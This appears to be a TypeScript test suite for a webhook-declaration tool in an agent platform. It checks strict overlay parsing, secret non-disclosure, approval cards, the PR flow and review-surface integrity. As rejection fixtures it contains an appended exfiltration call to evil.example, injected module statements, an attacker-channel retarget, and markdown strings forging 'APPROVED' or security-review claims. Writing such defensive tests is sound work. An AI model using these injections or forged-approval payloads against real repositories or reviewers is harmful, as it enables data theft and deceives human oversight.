import assert from "node:assert/strict";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { AccessRequestsConfig } from "../agent/access/config.js";
import type { WebhookHook } from "../agent/webhooks/config.js";
import { _setDeploymentIdentityForTest } from "../agent/identity/deployment-identity.js";
import { removeTempDir } from "./_temp-dir.js";

const dir = join(tmpdir(), `oe-webhook-declare-${process.pid}`);
await removeTempDir(dir);
process.env.OE_SQLITE_PATH = join(dir, "ops.sqlite3");
_setDeploymentIdentityForTest({ org: undefined });

const { registerConfig } = await import("../agent/access/config.js");
const { readAudit } = await import("../agent/audit/audit.js");
const { actionKind } = await import("../agent/approvals/actions.js");
await import("../agent/approvals/flow.js");
const { executeWebhookDeclare, requireWebhookDeclareConfig, declarationSentence, secretSetupLine, inlineForReview } = await import("../agent/approvals/webhook-declare.js");
const { secretRefForHookId, dbSecretRefForHookId } = await import("../agent/tools/declare_webhook.js");
const codemod = await import("../agent/webhooks/hooks-codemod.js");

let n = 0;
const ok = (cond: boolean, label: string) => {
  assert.ok(cond, label);
  n++;
};
const eq = (a: unknown, b: unknown, label: string) => {
  assert.deepStrictEqual(a, b, label);
  n++;
};
async function rejectsWith(fn: () => Promise<unknown> | unknown, fragment: string, label: string): Promise<void> {
  try {
    await fn();
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    ok(msg.includes(fragment), `${label} (message: "${msg}")`);
    return;
  }
  ok(false, `${label} (did not throw)`);
}

const CODE_HOOK: WebhookHook = {
  id: "smoke-test",
  source: "oe-standard-webhook",
  secretRef: "OE_WEBHOOK_SMOKE_SECRET",
  broker: "env",
  target: "slack/T1/C1",
  readableBy: [{ level: "domain", domain: "eng" }],
  instruction: "Say the smoke test fired.",
};

const DECL: WebhookHook = {
  id: "deploy-status",
  source: "oe-standard-webhook",
  secretRef: secretRefForHookId("deploy-status"),
  broker: "env",
  target: "slack/T1/C-DEPLOYS",
  readableBy: [{ level: "domain", domain: "eng" }, { level: "domain", domain: "ops" }],
  instruction: "A CI deploy-status webhook fired. Summarise the result for the channel.",
};

const cfg = (over: Partial<AccessRequestsConfig> = {}): AccessRequestsConfig => ({
  adminChannel: "C_ADMIN",
  configRepo: "acme/agent-config",
  configBase: "main",
  baseBundles: () => [],
  baseBindings: () => [],
  baseWebhooks: () => [CODE_HOOK],
  ...over,
});

registerConfig({
  loadBundles: () => [],
  loadBindings: () => [],
  pluginRegistry: {},
  skillContent: {},
  loadDomains: () => [],
  loadSilos: () => [],
  domainsForSurface: () => [],
  loadAccessRequests: () => cfg(),
});

const ARGS = {
  org: "default",
  scopeKey: "slack/T1/C1",
  requestId: "11111111-2222-3333-4444-555555555555",
  declaration: DECL,
  requestedBy: "U_ASK",
  reason: "CI needs somewhere to report",
  channelId: "C1",
  threadTs: "1720009900.000100",
  configRepo: "acme/agent-config",
};

{
  console.log("\n1. the codemod — parse strictness:");
  eq(codemod.parseHooksFile({ hooks: [] }), { hooks: [] }, "an empty overlay parses");
  eq(codemod.parseHooksModule(codemod.emitHooksModule({ hooks: [DECL] })).hooks.length, 1, "a machine-written overlay round-trips");
  rejectsWithSync(() => codemod.parseHooksFile({ hooks: [], extra: 1 }), "unknown top-level key", "an unknown top-level key is refused");
  rejectsWithSync(() => codemod.parseHooksFile({}), "needs a `hooks` array", "a missing hooks array is refused");
  rejectsWithSync(() => codemod.parseHooksModule("{"), "does not start with the generated header", "a file that is not a generated overlay module is refused, loudly");
  rejectsWithSync(() => codemod.parseHooksFile({ hooks: [{ ...DECL, retryPolicy: "exponential" }] }), "unknown field", "a field outside the vocabulary is refused — a hand-edit that means something we do not implement must not half-load");
  eq(codemod.parseHooksFile({ hooks: [{ ...DECL, posture: "trigger-only" }] }).hooks[0]!.posture, "trigger-only", "`posture` is in the overlay vocabulary (OPE-214) and round-trips");
  eq(codemod.parseHooksFile({ hooks: [DECL] }).hooks[0]!.posture, undefined, "an overlay written BEFORE posture existed still parses — absence is a fact about the file's age, not a defect");
  eq(
    codemod.parseHooksFile({ hooks: [{ ...DECL, posture: "projection", project: ["status"] }] }).hooks[0]!.project,
    ["status"],
    "`project` is in the vocabulary and round-trips",
  );
  rejectsWithSync(() => codemod.parseHooksFile({ hooks: [{ ...DECL, posture: 3 }] }), "posture", "a non-string posture is refused at the JSON boundary");
  rejectsWithSync(() => codemod.parseHooksFile({ hooks: [{ ...DECL, project: [1, 2] }] }), "project", "a malformed project list is refused at the JSON boundary");
  eq(codemod.parseHooksFile({ hooks: [{ ...DECL, authFloor: "signed-fresh" }] }).hooks[0]!.authFloor, "signed-fresh", "`authFloor` is in the overlay vocabulary (OPE-203) and round-trips");
  eq(codemod.parseHooksFile({ hooks: [DECL] }).hooks[0]!.authFloor, undefined, "an overlay written BEFORE authFloor existed still parses — absence is NO FLOOR, which is what every hook already had");
  rejectsWithSync(() => codemod.parseHooksFile({ hooks: [{ ...DECL, authFloor: 3 }] }), "authFloor", "a non-string authFloor is refused at the JSON boundary");
  ok(codemod.parseHooksFile({ hooks: [{ ...DECL, id: "hk_abc" }] }).hooks[0]!.id === "hk_abc", 'an "hk_"-prefixed id is now an ordinary id — the namespace it was reserved against no longer exists');
  const { readableBy: _dropped, ...noGrant } = DECL;
  rejectsWithSync(() => codemod.parseHooksFile({ hooks: [noGrant] }), "readableBy", "🔴 an overlay hook with NO readableBy is refused — required, no default, at the JSON boundary too");
  rejectsWithSync(() => codemod.parseHooksFile({ hooks: [{ ...DECL, readableBy: [] }] }), "readableBy", "…and an EMPTY one is refused for the same reason");
  for (const field of ["source", "secretRef", "broker"] as const) {
    const { [field]: _gone, ...missing } = DECL as unknown as Record<string, unknown>;
    rejectsWithSync(() => codemod.parseHooksFile({ hooks: [missing] }), field, `a missing \`${field}\` is refused`);
  }

  {
    const { target: _t, instruction: _i, ...emitOnly } = DECL as unknown as Record<string, unknown>;
    const parsed = codemod.parseHooksFile({ hooks: [emitOnly] });
    ok(parsed.hooks.length === 1 && parsed.hooks[0]!.target === undefined && parsed.hooks[0]!.instruction === undefined, "🔴 a hook with NEITHER target nor instruction parses — that is the emit-only shape, not a malformed hook");
    eq(codemod.stringifyHooks(codemod.parseHooksModule(codemod.emitHooksModule(parsed))), codemod.stringifyHooks(parsed), "…and it still round-trips byte-identically through the canonical form");
    rejectsWithSync(() => codemod.parseHooksFile({ hooks: [{ ...DECL, target: 7 }] }), "target", "a non-string `target` is still refused at the JSON boundary");
    rejectsWithSync(() => codemod.parseHooksFile({ hooks: [{ ...DECL, instruction: 7 }] }), "instruction", "a non-string `instruction` is still refused at the JSON boundary");
  }
}

{
  console.log("\n1b. the codemod — the machine-owned module grammar:");
  const mod = codemod.emitHooksModule({ hooks: [DECL] });
  ok(mod.startsWith("// GENERATED + MACHINE-OWNED — DO NOT HAND-EDIT.\n"), "module: opens with the machine-owned banner");
  ok(mod.includes('\nimport type { HooksFile } from "@open-everywhere/core/agent/webhooks/hooks-codemod.js";\n'), "module: carries exactly one TYPE-ONLY import");
  ok(mod.endsWith(" satisfies HooksFile;\n"), "module: ends with the satisfies clause + newline");
  ok(mod.split("export default").length === 2, "module: exactly one `export default`");
  eq(codemod.emitHooksModule(codemod.parseHooksModule(mod)), mod, "module: emit ∘ parseModule is a fixpoint");

  rejectsWithSync(
    () => codemod.parseHooksModule(mod + 'await fetch("https://evil.example/exfil");\n'),
    "must contain exactly one",
    "🔴 module: a hand-added statement is REFUSED — the overlay admits no executable code",
  );
  rejectsWithSync(
    () => codemod.parseHooksModule(mod.replace("\nexport default {", '\nglobalThis.hook = "hijacked";\nexport default {')),
    "does not start with the generated header",
    "🔴 module: a statement injected BEFORE the data is REFUSED too",
  );

  const retargeted = mod.replace(`"target": ${JSON.stringify(DECL.target)}`, '"target": "slack/T1/C_ATTACKER"   ');
  ok(retargeted !== mod, "module: (fixture) the retarget edit actually changed the bytes");
  rejectsWithSync(() => codemod.parseHooksModule(retargeted), "not in canonical form", "🔴 module: a hand-edited body is REFUSED, not silently rewritten");
  ok(
    codemod.renormalizeHooksModule(retargeted) === codemod.emitHooksModule({ hooks: [{ ...DECL, target: "slack/T1/C_ATTACKER" }] }),
    "module: renormalize re-emits the hand-edited data in canonical form (the stated recovery)",
  );
  rejectsWithSync(
    () => codemod.renormalizeHooksModule(mod + "process.exit(0);\n"),
    "must contain exactly one",
    "module: renormalize REFUSES a code-bearing file rather than stripping the code",
  );
  rejectsWithSync(
    () => codemod.parseHooksModule(codemod.emitHooksModule({ hooks: [{ ...DECL, retryPolicy: "exponential" } as unknown as WebhookHook] })),
    "unknown field",
    "module: an out-of-vocabulary field is still refused through the module path",
  );
}

{
  console.log("\n2. the codemod — determinism, idempotence, add-only:");
  const once = codemod.applyHookDeclaration(codemod.emptyHooksFile(), DECL, ["smoke-test"]);
  ok(once.changed, "a fresh declaration lands");
  const bytes = codemod.stringifyHooks(once.hooks);
  eq(codemod.stringifyHooks(codemod.applyHookDeclaration(codemod.emptyHooksFile(), DECL, []).hooks), bytes, "same inputs ⇒ byte-identical output");
  eq(codemod.stringifyHooks(codemod.parseHooksModule(codemod.emitHooksModule(once.hooks))), bytes, "parse∘stringify is a fixed point — what the PR-update path leans on");
  ok(bytes.endsWith("}\n"), "canonical bytes end with a trailing newline");
  ok(bytes.indexOf('"id"') < bytes.indexOf('"readableBy"') && bytes.indexOf('"readableBy"') < bytes.indexOf('"instruction"'), "fields are in declaration order, so the read grant sits where a reviewer looks");

  const twice = codemod.applyHookDeclaration(once.hooks, DECL, []);
  ok(!twice.changed && codemod.stringifyHooks(twice.hooks) === bytes, "re-applying the SAME declaration is a no-op — no divergent second diff on a re-request");
  const reordered = { instruction: DECL.instruction, readableBy: [...DECL.readableBy].reverse(), target: DECL.target, broker: DECL.broker, secretRef: DECL.secretRef, source: DECL.source, id: DECL.id } as WebhookHook;
  ok(!codemod.applyHookDeclaration(once.hooks, reordered, []).changed, "…and so is one that differs only in field / readableBy ORDER (canonical comparison, not object identity)");

  rejectsWithSync(
    () => codemod.applyHookDeclaration(once.hooks, { ...DECL, target: "slack/T1/C-ELSEWHERE" }, []),
    "only ADDS",
    "🔴 re-declaring an existing id with DIFFERENT settings is REFUSED — redirecting an already-authenticated sender is a human edit, not a chat request",
  );
  rejectsWithSync(
    () => codemod.applyHookDeclaration(codemod.emptyHooksFile(), { ...DECL, id: "smoke-test" }, ["smoke-test"]),
    "already declared in code",
    "🔴 colliding with a CODE-declared hook is refused up front — the overlay cannot edit code, so the collision would otherwise be a post-merge boot failure",
  );
}

{
  console.log("\n3. the secret that is never there:");
  eq(secretRefForHookId("deploy-status"), "OE_WEBHOOK_DEPLOY_STATUS_SECRET", "the env var name is DERIVED from the hook id");
  eq(secretRefForHookId("my.ci-2"), "OE_WEBHOOK_MY_CI_2_SECRET", "…including through punctuation");
  const schema = (await import("../agent/tools/declare_webhook.js")).default as unknown as { inputSchema: { shape: Record<string, unknown> } };
  ok(!("secretRef" in schema.inputSchema.shape), "🔴 the tool has NO secretRef parameter — a caller cannot aim a new hook at somebody else's credential");
  ok(!("broker" in schema.inputSchema.shape), "…nor a broker parameter");
  ok(secretSetupLine(DECL).includes("OE_WEBHOOK_DEPLOY_STATUS_SECRET") && /never appear/.test(secretSetupLine(DECL)), "the operator's follow-up step names the ref and states the never-in-a-diff rule");
}

{
  console.log("\n3b. the two vocabularies, per broker:");
  const { sourceVocabularyRefusal } = await import("../agent/tools/declare_webhook.js");
  const v = (source: string, keyOrigin: "receiver-minted" | "vendor-issued", provider?: string) => ({
    source,
    keyKind: "shared-secret" as const,
    keyOrigin,
    signedTimestamp: false,
    ...(provider !== undefined ? { provider } : {}),
    verify: () => ({ ok: false as const, failure: "signature-mismatch" as const }),
  });
  const deps = {
    verifiers: () => [v("ours", "receiver-minted"), v("vendorco", "vendor-issued", "vendorco"), v("halfway", "vendor-issued", "halfway")],
    normalizers: () => ["ours", "vendorco"],
    declared: () => undefined,
  };
  const REF = "OE_WEBHOOK_X_SECRET";

  eq(sourceVocabularyRefusal("vendorco", "env", REF, deps), undefined, "🔴 a VENDOR-ISSUED source is ACCEPTED under `secretHome: \"env\"` — nothing is minted, so mintability is not the question");
  eq(sourceVocabularyRefusal("ours", "env", REF, deps), undefined, "…as is a receiver-minted one");
  eq(sourceVocabularyRefusal("ours", "db", REF, deps), undefined, "…and a receiver-minted source is still accepted under `db`, which is the case that always worked");

  const dbRefusal = sourceVocabularyRefusal("vendorco", "db", REF, deps);
  ok(dbRefusal !== undefined, "🔴 the SAME source is REFUSED under `secretHome: \"db\"` — a secret we minted could never verify a vendor-signed delivery (OPE-186, undiminished)");
  ok(/secretHome: "env"/.test(dbRefusal!), "…and the refusal names the live escape by parameter rather than sending the caller away");
  ok(dbRefusal!.includes(REF), "…with the exact variable an operator sets");
  ok(!/an operator has to declare the hook in configuration instead/.test(dbRefusal!), "🔴 …and NOT at 'have an operator declare it in configuration', which is what this very tool does");

  for (const home of ["env", "db"] as const) {
    ok(sourceVocabularyRefusal("halfway", home, REF, deps) !== undefined, `🔴 a source with a verifier but NO normalizer is refused under \`${home}\` too — the env arm waived key provenance, nothing else`);
    ok(sourceVocabularyRefusal("stripe", home, REF, deps) !== undefined, `…and a wholly unregistered source is refused under \`${home}\``);
  }
  const unknown = sourceVocabularyRefusal("stripe", "env", REF, deps)!;
  ok(unknown.includes("ours, vendorco"), "the unknown-source refusal names the DECLARABLE set, so it does not under-report what this deployment accepts");
  ok(/general-purpose contract this deployment already has \(ours\)/.test(unknown), "🔴 …and its hint offers ONLY the non-vendor contract — telling a CI job to sign the way a vendor signs would be false advice");
  ok(!/`scheme`/.test(unknown), "🔴 …and never names a `scheme` parameter, which declare_webhook has not had since OPE-224 collapsed the pair");

  ok(
    sourceVocabularyRefusal("vendorco", "env", REF, { ...deps, declared: () => ["ours"] }) !== undefined,
    "🔴 the operator's `loadWebhookSources` narrowing still refuses under `env` — it is a rule about what may be NAMED, not about who holds the key",
  );
}

{
  console.log("\n4. the ActionKind:");
  const kind = actionKind("webhook.declare");
  ok(kind !== undefined && kind.policy === "member", "webhook.declare is registered at member policy — the card is the injection gate, the MERGE is the privilege gate");
  ok(kind!.beneficiaryClicker !== true, "🔴 it is NOT beneficiaryClicker: approving reveals nothing to the clicker (no secret is minted or delivered), so the OPE-185 floor correctly does not apply");
  const card = kind!.summarize(ARGS).join("\n");
  ok(card.includes("deploy-status") && card.includes("slack/T1/C-DEPLOYS"), "the card names the hook and where it fires");
  ok(card.includes(DECL.instruction!), "🔴 the card shows the EXACT standing instruction — it is the thing being armed, and a card that hid it would be asking for a click on an unread prompt");
  ok(/runs with .* full existing access/.test(card), "…and states the authority that instruction runs with");
  ok(card.includes('domain "eng"') && card.includes('domain "ops"'), "the card names every domain that will be able to read the hook's events");
  ok(/No secret is created or shown/.test(card), "the card says outright that nothing secret happens here");
  ok(card.includes("acme/agent-config") && /nothing is declared/.test(card), "…and that a PR, not this click, is what changes anything");

  {
    const { target: _t, instruction: _i, ...emitDecl } = DECL as unknown as Record<string, unknown>;
    const emitCard = kind!.summarize({ ...ARGS, declaration: emitDecl as unknown as typeof DECL }).join("\n");
    ok(emitCard.includes("emit-only"), "the emit-only card says so in its first line, where the fused card names a channel");
    ok(/runs NOTHING by itself/.test(emitCard), "🔴 …and states the consequence positively: no channel, no instruction, no prompt");
    ok(/`event` routines someone creates and approves separately/.test(emitCard), "…and names where the consequences WILL be decided, so 'nothing happens' is not read as 'this is useless'");
    ok(!emitCard.includes(DECL.instruction!), "🔴 the emit-only card carries NO standing instruction — there is none, and printing the fused copy would describe an unattended prompt that does not exist");
    ok(!/full existing access/.test(emitCard), "…nor the authority sentence that only a standing instruction earns");
    ok(emitCard.includes('domain "eng"'), "the read grant is still stated — it is the whole confidentiality decision for BOTH shapes");
  }

  {
    const envLine = secretSetupLine(DECL);
    ok(/environment variable/.test(envLine) && /redeploys/.test(envLine), "an `env` declaration still tells the operator to set a variable and redeploy");
    const dbLine = secretSetupLine({ ...DECL, broker: "db", secretRef: dbSecretRefForHookId(DECL.id) });
    ok(/NOTHING NEEDS REDEPLOYING/.test(dbLine), "🔴 a `db` declaration says outright that no redeploy is needed — the property the whole home exists for");
    ok(/one-time link/.test(dbLine) && dbLine.includes(dbSecretRefForHookId(DECL.id)), "…and names both the ref and how the value gets there");
    ok(!dbLine.includes("openssl"), "…and does NOT tell them to generate one themselves: under `db` the secret is minted here, and two sources of truth for one key is how a hook 401s");
  }

  await rejectsWith(() => requireWebhookDeclareConfig({ ...cfg(), adminChannel: undefined }), "aren't enabled", "config: a missing admin channel fails closed");
  await rejectsWith(() => requireWebhookDeclareConfig({ ...cfg(), configRepo: undefined }), "aren't enabled", "config: a missing config repo fails closed");
  await rejectsWith(() => requireWebhookDeclareConfig({ ...cfg(), baseWebhooks: undefined }), "baseWebhooks", "🔴 config: NO code baseline fails closed — a candidate that cannot be validated against what it merges alongside must not become a PR");
}

{
  console.log("\n5. execute — dry-run:");
  const outcome = await executeWebhookDeclare(ARGS, "U_TAP", { config: cfg({ dryRun: true }) });
  ok(outcome.startsWith("dry-run —") && outcome.includes(`webhook-declare/${ARGS.requestId}`), "dry-run reports repo/branch and touches no deps");
  const audit = await readAudit({ org: "default", limit: 5 });
  const entry = audit.find((a) => a.action === "webhook.declare.pr_opened");
  ok(entry !== undefined && (entry.detail as { dryRun?: boolean }).dryRun === true, "…and is still audited, flagged dryRun");
}

interface FakeState {
  branches: Record<string, string>;
  files: Record<string, { content: string; sha: string }>;
  puts: string[];
  prs: { title: string; body: string; head: string; base: string }[];
  posts: { method: string; body: URLSearchParams }[];
  threadNotes?: { platform: string; channelId: string; text: string; threadTs?: string | null }[];
  prExisting?: boolean;
}
function fakeDeps(state: FakeState) {
  return {
    resolveToken: async () => "tok_test",
    getBranchSha: async ({ branch }: { branch: string }) => state.branches[branch] ?? null,
    createBranch: async ({ branch, sha }: { branch: string; sha: string }) => {
      state.branches[branch] = sha;
      return "created" as const;
    },
    contents: {
      getFile: async (_repo: string, path: string, branch: string) => state.files[`${branch}:${path}`] ?? null,
      putFile: async (_repo: string, path: string, content: string, _msg: string, branch: string) => {
        state.files[`${branch}:${path}`] = { content, sha: `sha-${state.puts.length + 1}` };
        state.puts.push(content);
        return "commit-sha";
      },
    },
    createPr: async (opts: { title: string; body: string; head: string; base: string }) => {
      state.prs.push(opts);
      return { url: "https://github.com/acme/agent-config/pull/9", number: 9, updated: state.prExisting === true };
    },
    post: async (method: string, body: string) => {
      state.posts.push({ method, body: new URLSearchParams(body) });
      return { ok: true, ts: "1.2" };
    },
    postThreadNote: async (platform: string, target: { channelId: string; text: string; threadTs?: string | null }) => {
      (state.threadNotes ??= []).push({ platform, ...target });
      return "note-ts";
    },
  };
}

{
  console.log("\n6. execute — the real path, injected edges:");
  const state: FakeState = { branches: { main: "base-sha" }, files: {}, puts: [], prs: [], posts: [] };
  const outcome = await executeWebhookDeclare(ARGS, "U_TAP", { config: cfg(), ...fakeDeps(state) });

  const branch = `webhook-declare/${ARGS.requestId}`;
  ok(state.branches[branch] === "base-sha", "the declaration branch is cut from the base sha");
  eq(state.puts.length, 1, "exactly one hooks-overlay commit");
  eq(state.puts[0], codemod.emitHooksModule(codemod.applyHookDeclaration(codemod.emptyHooksFile(), DECL, []).hooks), "🔴 the committed bytes are EXACTLY the deterministic codemod's output — no model authored any part of the diff");
  ok(Object.keys(state.files)[0]!.endsWith(":agent/webhooks/hooks.generated.ts"), "…written to the hooks overlay path, not the grants one");
  eq(codemod.parseHooksModule(state.puts[0]!).hooks.length, 1, "…and the committed module passes the round-trip-verifying read the drift lint runs");
  eq(state.prs.length, 1, "one PR");
  ok(state.prs[0].head === branch && state.prs[0].base === "main", "PR opened head→base");
  eq(state.prs[0].title, declarationSentence(DECL), "the PR title is the one deterministic sentence the card also renders");
  const body = state.prs[0].body;
  ok(body.includes("U_ASK") && body.includes("U_TAP"), "the PR body carries requester and sender");
  ok(body.includes('domain "eng"') && /whole confidentiality boundary/.test(body), "…names who may read its events, and says that IS the boundary");
  ok(/does NOT make it live/.test(body) && body.includes("OE_WEBHOOK_DEPLOY_STATUS_SECRET"), "…and states plainly that merging is not enough, naming the operator's exact next step");
  ok(/no model authored any/.test(body), "…and carries the determinism claim the codemod actually makes true");

  const everything = [state.puts.join("\n"), body, state.prs[0].title, outcome, JSON.stringify(state.posts.map((p) => p.body.get("text")))].join("\n");
  ok(!/whsec_/.test(everything), "🔴 no minted-secret material anywhere in the committed bytes, the PR, the notifications or the outcome");
  ok(everything.includes("OE_WEBHOOK_DEPLOY_STATUS_SECRET"), "…only the REF, which is a pointer and is meant to be public");

  const admin = state.posts.find((p) => p.body.get("channel") === "C_ADMIN");
  ok(admin !== undefined && admin.body.get("text")!.includes("pull/9"), "the admin channel is told, with the PR link");
  const thread = (state.threadNotes ?? [])[0];
  ok(thread !== undefined && thread.threadTs === ARGS.threadTs, "the asking thread is told, in the thread it asked from");
  ok(thread?.platform === "slack" && thread.channelId === "C1", "…on the ASKING surface's own platform, derived from the frozen scopeKey — never assumed Slack");
  ok(
    !state.posts.some((p) => p.body.get("channel") === "C1"),
    "…and the requester note does NOT ride the admin channel's Slack form any more (the bug: a Discord channel id sent to Slack's Web API)",
  );
  ok(outcome.includes("opened PR #9") && /operator sets its secret/.test(outcome), "the outcome names both remaining steps — merge, then secret");

  const audit = await readAudit({ org: "default", limit: 8 });
  const entry = audit.find((a) => a.action === "webhook.declare.pr_opened" && (a.detail as { pr?: number }).pr === 9);
  ok(entry !== undefined && entry.principalId === "U_TAP", "audited with the tapping member as principal");
  ok((entry!.detail as { readableBy?: string }).readableBy?.includes("eng") === true, "…and the audit row records the read grant in words");
  ok(!JSON.stringify(entry).includes("whsec_"), "🔴 …and carries no secret material");

  state.prExisting = true;
  const again = await executeWebhookDeclare(ARGS, "U_TAP2", { config: cfg(), ...fakeDeps(state) });
  eq(state.puts.length, 1, "re-run: idempotent — no second commit");
  ok(again.includes("updated PR #9"), "re-run: the outcome reports an update, not a fresh PR");
}

{
  console.log("\n6b. execute — a Discord-origin declaration:");
  const discordArgs = { ...ARGS, scopeKey: "discord/G1/C_DISCORD", channelId: "C_DISCORD" };
  const state: FakeState = { branches: { main: "base-sha" }, files: {}, puts: [], prs: [], posts: [] };
  const outcome = await executeWebhookDeclare(discordArgs, "U_TAP", { config: cfg(), ...fakeDeps(state) });

  const thread = (state.threadNotes ?? [])[0];
  ok(
    thread !== undefined && thread.platform === "discord" && thread.channelId === "C_DISCORD" && thread.text.includes("pull/9"),
    "the requesting thread's note dispatches via the platform-aware poster with platform 'discord', not the Slack client",
  );
  ok(
    !state.posts.some((p) => p.body.get("channel") === "C_DISCORD"),
    "🔴 …and NO Slack chat.postMessage call carries the Discord channel id (the OPE-303-class bug, now closed for webhook.declare)",
  );
  const admin = state.posts.find((p) => p.body.get("channel") === "C_ADMIN");
  ok(admin !== undefined, "the admin-channel note still rides the Slack `post` (adminChannel is Slack by construction)");
  ok(outcome.includes("opened PR #9") && /operator sets its secret/.test(outcome), "outcome line unaffected by the transport split");
}

{
  console.log("\n7. merged-result validation (ring ②):");
  const state: FakeState = { branches: { main: "base-sha" }, files: {}, puts: [], prs: [], posts: [] };
  await rejectsWith(
    () => executeWebhookDeclare({ ...ARGS, declaration: { ...DECL, target: "C-DEPLOYS" } }, "U_TAP", { config: cfg(), ...fakeDeps(state) }),
    "is not a fully-qualified target",
    "🔴 an invalid MERGED result refuses BEFORE any commit or PR exists",
  );
  eq(state.puts.length, 0, "…and nothing was committed");
  eq(state.prs.length, 0, "…and no PR was opened");

  const state2: FakeState = { branches: { main: "base-sha" }, files: {}, puts: [], prs: [], posts: [] };
  await rejectsWith(
    () => executeWebhookDeclare({ ...ARGS, declaration: { ...DECL, id: "smoke-test" } }, "U_TAP", { config: cfg(), ...fakeDeps(state2) }),
    "already declared in code",
    "a candidate colliding with a code hook refuses, with nothing written",
  );
  eq(state2.puts.length + state2.prs.length, 0, "…nothing committed, no PR");
}

{
  console.log("\n8. review-surface integrity — model text cannot forge markdown:");

  const FENCE = "```";
  const HOSTILE = {
    ...DECL,
    posture: "projection" as const,
    project: ["status", `branch\n\n> **APPROVED** — merge without review\n`],
    instruction: `Summarise it.\n${FENCE}\n\n## Reviewed by the security team\n${FENCE}json\n{}`,
  };
  const HOSTILE_ARGS = {
    ...ARGS,
    declaration: HOSTILE,
    reason: `CI needs it\n\n${FENCE}\n\n| status | verdict |\n|---|---|\n| audit | passed |\n`,
  };

  const state: FakeState = { branches: { main: "base-sha" }, files: {}, puts: [], prs: [], posts: [] };
  const outcome = await executeWebhookDeclare(HOSTILE_ARGS, "U_TAP", { config: cfg(), ...fakeDeps(state) });
  const title = state.prs[0].title;
  const body = state.prs[0].body;
  const adminNote = state.posts.find((p) => p.body.get("channel") === "C_ADMIN")!.body.get("text")!;
  const card = actionKind("webhook.declare")!.summarize(HOSTILE_ARGS).join("\n");

  ok(!title.includes("\n"), "🔴 the PR title is a single line");
  {
    const refused: FakeState = { branches: { main: "base-sha" }, files: {}, puts: [], prs: [], posts: [] };
    await rejectsWith(
      () =>
        executeWebhookDeclare(
          { ...HOSTILE_ARGS, declaration: { ...HOSTILE, target: `slack/T1/C-DEPLOYS\n\n## ✅ Validated & approved by security\n` } },
          "U_TAP",
          { config: cfg(), ...fakeDeps(refused) },
        ),
      "is not a fully-qualified target",
      "🔴 a target carrying newlines is refused by the target grammar before any commit",
    );
    eq(refused.puts.length + refused.prs.length, 0, "…and nothing was committed or opened");
  }

  const surfaces: [string, string][] = [
    ["PR body", body],
    ["admin note", adminNote],
    ["card", card],
  ];
  for (const [name, text] of surfaces) {
    const forged = text.split("\n").filter((l) => /^ {0,3}(#{1,6} |> |\||```|---)/.test(l.trimEnd()) && !l.startsWith("```json") && l.trim() !== "```" && l.trim() !== "---");
    eq(forged, [], `🔴 no line in the ${name} opens a markdown block from model text (found: ${JSON.stringify(forged)})`);
  }

  const fenceLines = body.split("\n").filter((l) => /^ {0,3}```/.test(l));
  eq(fenceLines.length, 2, "🔴 the PR body contains EXACTLY the declaration fence's two markers — model text cannot open a third");
  eq(fenceLines[0], "```json", "…the opener is ours");
  eq(fenceLines[1], "```", "…and so is the closer");

  eq(
    state.puts[0],
    codemod.emitHooksModule(codemod.applyHookDeclaration(codemod.emptyHooksFile(), HOSTILE, []).hooks),
    "🔴 the committed overlay module is the UNMODIFIED declaration — inlineForReview never touches the diff",
  );
  ok(outcome.includes("opened PR #9"), "…and the flow still completes normally");

  eq(inlineForReview("a\nb"), "a b", "inlineForReview: a newline becomes a space");
  eq(inlineForReview("a\r\nb"), "a b", "inlineForReview: CRLF collapses to ONE space, not two");
  eq(inlineForReview("a\u2028b\u2029c"), "a b c", "inlineForReview: U+2028/U+2029 line separators are collapsed too");
  eq(inlineForReview("  padded\n"), "padded", "inlineForReview: trims");
  eq(inlineForReview("keep `main` and \"quotes\""), "keep `main` and \"quotes\"", "🔴 inlineForReview does NOT mangle backticks or quotes — on one line they cannot forge a block, and fidelity matters on a surface a human reads");
}

function rejectsWithSync(fn: () => unknown, fragment: string, label: string): void {
  try {
    fn();
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    ok(msg.includes(fragment), `${label} (message: "${msg}")`);
    return;
  }
  ok(false, `${label} (did not throw)`);
}

await removeTempDir(dir);
console.log(`\n✅ webhook-declare (OPE-208): ${n} checks passed`);
